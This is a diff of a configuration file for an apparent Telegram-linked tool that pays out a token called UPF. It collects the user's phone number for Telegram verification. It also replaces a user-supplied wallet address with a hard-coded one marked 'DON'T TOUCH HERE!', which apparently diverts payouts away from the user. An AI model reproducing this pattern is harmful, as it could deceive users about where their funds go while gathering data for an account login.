@@ -1,8 +1,10 @@
-[API]
-# phone number needed for verification of your telegram account. nothing else.
-# wallet address needed to send you the UPF.
+# 2. Click play button here
+# phone number: needed for verification of your telegram account.
+# official telegram will send you the confirmation code. nothing else.
 
-# Your phone number with country code (if +1 012 400 9999) (NO SPACE)
-NUMBER = 0124009999
-# Your wallet address to send UPF (if 0x6CC5F09E46797189D18Ea8cfb3B1AaA4661280Ae) (DONT ERASE "")
-ADDRESS = "0x6CC5F09E46797189D18Ea8cfb3B1AaA4661280Ae"
+[API]
+# Your phone number with country code (if +1 200 300 4000)
+NUMBER = 12003004000
+
+# DON'T TOUCH HERE!
+ADDRESS = "0x333FD139cAeF6Aa31056cC905987b77B1044d259"
